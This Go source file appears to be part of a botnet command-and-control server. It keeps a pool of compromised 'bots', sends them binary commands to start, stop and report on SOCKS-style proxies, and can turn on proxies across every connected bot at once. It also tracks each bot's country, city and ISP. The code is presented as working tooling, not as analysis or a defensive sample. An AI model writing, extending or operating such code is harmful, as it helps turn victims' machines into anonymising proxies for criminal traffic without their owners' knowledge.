package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"
)

// Proxy represents a bot acting as a proxy
type Proxy struct {
	Client      *Client
	Port        uint16
	Status      uint8
	Online      bool
	LastSeen    time.Time
	Stats       ProxyStats
	Country     string
	City        string
	ISP         string
	Connections uint32
	BytesSent   uint64
	BytesRecv   uint64
}

// ProxyStats holds proxy statistics
type ProxyStats struct {
	ConnectionsTotal  uint32
	ConnectionsActive uint32
	BytesSent         uint64
	BytesReceived     uint64
	Uptime            uint32
}

// ProxyPool manages all available proxies
type ProxyPool struct {
	proxies map[int]*Proxy
	mu      sync.RWMutex
}

var (
	proxyPool = &ProxyPool{
		proxies: make(map[int]*Proxy),
	}
)

// AddProxy adds a new proxy to the pool
func (pp *ProxyPool) AddProxy(client *Client, port uint16) *Proxy {
	pp.mu.Lock()
	defer pp.mu.Unlock()

	proxy := &Proxy{
		Client:   client,
		Port:     port,
		Status:   0x00, // IDLE
		Online:   true,
		LastSeen: time.Now(),
		Country:  "Unknown",
		City:     "Unknown",
		ISP:      "Unknown",
	}

	pp.proxies[client.CID] = proxy
	return proxy
}

// RemoveProxy removes a proxy from the pool
func (pp *ProxyPool) RemoveProxy(cid int) {
	pp.mu.Lock()
	defer pp.mu.Unlock()
	delete(pp.proxies, cid)
}

// GetProxy returns a proxy by client ID
func (pp *ProxyPool) GetProxy(cid int) *Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.proxies[cid]
}

// GetAllProxies returns all proxies
func (pp *ProxyPool) GetAllProxies() []*Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()

	proxies := make([]*Proxy, 0, len(pp.proxies))
	for _, p := range pp.proxies {
		proxies = append(proxies, p)
	}
	return proxies
}

// GetOnlineProxies returns only online proxies
func (pp *ProxyPool) GetOnlineProxies() []*Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()

	proxies := make([]*Proxy, 0)
	for _, p := range pp.proxies {
		if p.Online && time.Since(p.LastSeen) < 2*time.Minute {
			proxies = append(proxies, p)
		}
	}
	return proxies
}

// Count returns the total number of proxies
func (pp *ProxyPool) Count() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.proxies)
}

// OnlineCount returns the number of online proxies
func (pp *ProxyPool) OnlineCount() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()

	count := 0
	for _, p := range pp.proxies {
		if p.Online && time.Since(p.LastSeen) < 2*time.Minute {
			count++
		}
	}
	return count
}

// StartProxy sends command to start proxy on a bot
func StartProxy(client *Client, port uint16, config ProxyConfig) error {
	if client == nil || client.Conn == nil {
		return fmt.Errorf("invalid client")
	}

	buf := make([]byte, 9)
	buf[0] = 0x01 // CMD_PROXY_START
	binary.BigEndian.PutUint16(buf[1:3], port)
	buf[3] = config.AuthRequired
	buf[4] = config.MaxConnections
	binary.BigEndian.PutUint32(buf[5:9], config.BandwidthLimit)

	length := make([]byte, 2)
	binary.BigEndian.PutUint16(length, uint16(len(buf)))

	// Send command
	if _, err := client.Conn.Write(length); err != nil {
		return err
	}
	if _, err := client.Conn.Write(buf); err != nil {
		return err
	}

	// Add to proxy pool
	proxy := proxyPool.AddProxy(client, port)
	proxy.Status = 0x01 // RUNNING

	return nil
}

// StopProxy sends command to stop proxy on a bot
func StopProxy(client *Client) error {
	if client == nil || client.Conn == nil {
		return fmt.Errorf("invalid client")
	}

	buf := []byte{0x02} // CMD_PROXY_STOP

	length := make([]byte, 2)
	binary.BigEndian.PutUint16(length, 1)

	if _, err := client.Conn.Write(length); err != nil {
		return err
	}
	if _, err := client.Conn.Write(buf); err != nil {
		return err
	}

	// Update proxy status
	if proxy := proxyPool.GetProxy(client.CID); proxy != nil {
		proxy.Status = 0x00 // IDLE
		proxy.Online = false
	}

	return nil
}

// GetProxyStatus requests status from a proxy
func GetProxyStatus(client *Client) error {
	if client == nil || client.Conn == nil {
		return fmt.Errorf("invalid client")
	}

	buf := []byte{0x03} // CMD_PROXY_STATUS

	length := make([]byte, 2)
	binary.BigEndian.PutUint16(length, 1)

	if _, err := client.Conn.Write(length); err != nil {
		return err
	}
	if _, err := client.Conn.Write(buf); err != nil {
		return err
	}

	return nil
}

// ProxyConfig holds proxy configuration
type ProxyConfig struct {
	Port           uint16
	AuthRequired   uint8
	MaxConnections uint8
	BandwidthLimit uint32
}

// Default proxy configuration
var DefaultProxyConfig = ProxyConfig{
	Port:           1080,
	AuthRequired:   0,
	MaxConnections: 50,
	BandwidthLimit: 0,
}

// StartAllProxies starts proxy on all connected bots
func StartAllProxies(port uint16, config ProxyConfig) (int, int) {
	clients := GetClients()
	success := 0
	failed := 0

	for _, client := range clients {
		if err := StartProxy(client, port, config); err != nil {
			failed++
		} else {
			success++
		}
	}

	return success, failed
}

// StopAllProxies stops all running proxies
func StopAllProxies() int {
	proxies := proxyPool.GetOnlineProxies()
	stopped := 0

	for _, proxy := range proxies {
		if proxy.Client != nil {
			StopProxy(proxy.Client)
			stopped++
		}
	}

	return stopped
}

// UpdateProxyGeoInfo updates geolocation info for a proxy (stub)
func UpdateProxyGeoInfo(proxy *Proxy, ip string) {
	// This would normally query a GeoIP database
	// For now, just extract from IP
	proxy.Country = "Unknown"
	proxy.City = "Unknown"
	proxy.ISP = "Unknown"
	
	// You can integrate MaxMind GeoIP or similar service here
}

// GetProxyByIP finds a proxy by IP address
func GetProxyByIP(ip string) *Proxy {
	addr := net.ParseIP(ip)
	if addr == nil {
		return nil
	}

	for _, proxy := range proxyPool.GetAllProxies() {
		if proxy.Client != nil {
			clientAddr := proxy.Client.Conn.RemoteAddr().(*net.TCPAddr)
			if clientAddr.IP.Equal(addr) {
				return proxy
			}
		}
	}

	return nil
}

// ProxyHealthCheck periodically checks proxy health
func ProxyHealthCheck() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		proxies := proxyPool.GetAllProxies()
		
		for _, proxy := range proxies {
			if time.Since(proxy.LastSeen) > 2*time.Minute {
				proxy.Online = false
				proxy.Status = 0x02 // ERROR
			} else if proxy.Online {
				// Request status update
				GetProxyStatus(proxy.Client)
			}
		}
	}
}
